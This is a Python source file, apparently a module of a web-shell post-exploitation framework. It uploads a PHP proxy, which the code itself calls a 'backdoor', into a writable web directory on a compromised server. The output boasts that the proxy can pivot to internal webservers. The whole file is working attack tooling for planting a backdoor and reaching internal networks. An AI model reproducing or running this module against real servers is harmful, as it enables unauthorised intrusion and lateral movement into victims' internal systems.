'''
Created on 20/set/2011

@author: norby
'''


from core.module import Module, ModuleException
from core.vector import VectorList, Vector as V
from core.parameters import ParametersList, Parameter as P
from urlparse import urlparse
import re


classname = 'PhpProxy'
    
class PhpProxy(Module):

    params = ParametersList('Install PHP proxy (needs remote php-curl)', [],
                    P(arg='rdir', help='Remote writable web folder or \'find\' automatically', default='find', pos=0),
                    P(arg='rname', help='Remote file name', default='weepro.php', pos=1))
    

    def __get_backdoor(self):
        
        backdoor_path = 'modules/net/external/phpproxy.php'

        try:
            f = open(backdoor_path)
        except IOError:
            raise ModuleException(self.name,  "'%s' not found" % backdoor_path)
             
        return f.read()   
        
    def __upload_file_content(self, content, rpath):
        self.modhandler.load('file.upload').set_file_content(content)
        self.modhandler.set_verbosity(6)
        response = self.modhandler.load('file.upload').run({ 'lpath' : 'fake', 'rpath' : rpath })
        self.modhandler.set_verbosity()
        
        return response
        
    def __find_writable_dir(self, path = 'find'):
        
        self.modhandler.set_verbosity(6)
        
        self.modhandler.load('find.webdir').run({ 'rpath' : path })
        
        url = self.modhandler.load('find.webdir').found_url
        dir = self.modhandler.load('find.webdir').found_dir
        
        self.modhandler.set_verbosity()
        
        return dir, url
        
    
    def run_module(self, rdir, rname):
        
        path, url = self.__find_writable_dir(rdir)

        if path and url:

            path = path + rname
            url = url + rname

        
            phpfile = self.__get_backdoor()
            response = self.__upload_file_content(phpfile, path)
        
            if response:
                self.mprint('[%s] PHP proxy uploaded as \'%s\'\n[%s] Calling %s?u=http://site.com\n[%s] can also pivot to internal webservers' % (self.name, path, self.name, url, self.name))
        
            return
    

        raise ModuleException(self.name,  "No writable web directory to upload PHP proxy")
        
